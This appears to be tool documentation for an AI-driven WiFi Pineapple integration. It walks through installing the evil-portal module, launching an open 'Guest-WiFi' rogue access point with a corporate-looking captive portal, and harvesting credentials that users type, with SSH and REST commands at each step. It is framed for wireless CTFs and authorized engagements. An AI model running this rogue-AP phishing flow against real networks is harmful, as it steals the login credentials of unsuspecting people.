# Pineapple modules — walkthrough

**Verified against:** Pineapple Mark VII firmware 3.x as of 2026-Q3

A scripted engagement that (a) enumerates what's installed, (b) installs
the community `evil-portal` module, (c) runs a captive-portal capture
against a rogue AP, (d) tears down cleanly. All from the MCP's tool
surface; the underlying REST + SSH primitives are noted at each step.

Assumes `PINEAPPLE_HOST`, `PINEAPPLE_TOKEN`, and `PINEAPPLE_SSH_KEY`
are set (see `docs/pineapple_setup.md § Env vars`).

## Step 1 — Enumerate

```
list_modules()
```

Under the hood: `GET /api/modules` → array of `{slug, name, version,
installed, enabled}`. Cache the response; step 3 branches on whether
`evil-portal` is already present.

Direct SSH equivalent, useful when the API is unreachable:

```
ssh root@172.16.42.1 'ls -la /pineapple/modules/'
```

Log the installed set to `call_log(session_id)` — future assistant
turns should not re-enumerate on every call.

## Step 2 — Install if missing

```
if "evil-portal" not in [m.slug for m in list_modules()]:
    install_module("evil-portal")
```

Under the hood: `POST /api/modules/install {slug: "evil-portal"}`. The
Pineapple pulls the module from Hak5's community index. If the device
can't reach the index (con network isolation), sideload:

```
scp evil-portal.tar.gz root@172.16.42.1:/tmp/
ssh root@172.16.42.1 'cd /pineapple/modules && tar -xzf /tmp/evil-portal.tar.gz'
ssh root@172.16.42.1 '/pineapple/modules/evil-portal/bootstrap.sh'
ssh root@172.16.42.1 '/etc/init.d/pineapd restart'
```

The MCP wraps this as `sideload_module(local_path)`; it computes the
slug from `module.info` in the archive.

## Step 3 — Enable

```
enable_module("evil-portal")
```

Under the hood: `POST /api/modules/enable {slug}`. The WebUI now
exposes the module's template chooser at `/#/modules/evil-portal`.

## Step 4 — Configure a portal template

Community modules typically expose their own REST paths under
`/api/modules/<slug>/*`. For evil-portal:

- `GET /api/modules/evil-portal/templates` — list installed templates.
- `POST /api/modules/evil-portal/activate {template}` — pick one.
- `POST /api/modules/evil-portal/config {ssid, iface, ...}` — configure
  the AP the portal will front.

The MCP's `serve_captive_portal(handle, template)` wraps this — the
assistant doesn't need to touch module-specific paths directly.

## Step 5 — Bring up the rogue AP

```
handle = create_rogue_ap({
    ssid: "Guest-WiFi",
    channel: 6,
    band: "2.4",
    security: "open",
    iface: "wlan0"
})
serve_captive_portal(handle, template="generic-corp")
```

`create_rogue_ap` is SSH (writes a `hostapd.conf`, launches under a
named procd service). `serve_captive_portal` is a mix — evil-portal
module for template selection (API), dnsmasq + iptables plumbing (SSH).

## Step 6 — Harvest

Watch the module's log stream:

```
ssh root@172.16.42.1 'tail -f /pineapple/modules/evil-portal/log/portal.log'
```

Or subscribe to the module's event resource:

```
p1n3nut5://sessions/<id>/events?filter=module:evil-portal
```

Captured credentials land in the module's log and can be fetched via:

```
GET /api/modules/evil-portal/credentials
```

For a WCTF, the flag is often what the target user typed into the
form — read the log line, extract, done.

## Step 7 — Tear down

```
stop_rogue_ap(handle)  # kills hostapd + dnsmasq
disable_module("evil-portal")  # deactivate portal
```

`MAX_ROGUE_MINUTES` (if set) auto-tears-down after N minutes; belt and
braces.

## Uninstall

Rare mid-engagement; more commonly at end-of-day cleanup:

```
uninstall_module("evil-portal")
```

Under the hood: `POST /api/modules/uninstall {slug}`. Destructive —
removes the module directory. Any accumulated logs go with it, so
`scp` anything you care about first.

## Failure modes

- **`install_module` 404.** Community index unreachable. Sideload
  (Step 2 fallback).
- **`enable_module` 200 but WebUI doesn't show the module.** The
  Pineapple's WebUI aggressively caches; open a private window or
  restart pineapd via SSH.
- **Captive portal comes up but no client associates.** Check the AP
  interface is actually in AP mode and beaconing:
  `iw dev wlan0 info` should show `type AP`.
- **Credentials log stays empty.** DNS/HTTP redirect chain isn't
  firing. `curl` from an associated STA to any external hostname
  should land on the portal page. If not, `iptables -L -n -t nat`
  will show whether the redirect rules exist.
- **Module install succeeds but `procd` doesn't start it.** Missing
  `bootstrap.sh` run. `ssh root@... '/pineapple/modules/<slug>/bootstrap.sh'`
  and retry.

## Cite

- Hak5 WiFi Pineapple Mark VII documentation.
- knowledge/pineap/walkthrough.md — for PineAP-side steps in a combined
  KARMA + captive-portal engagement.
- knowledge/captive-portal/walkthrough.md — the portal side in detail.
- pineapple_endpoints.json: `pep-list-modules`, `pep-install-module`,
  `pep-uninstall-module`.
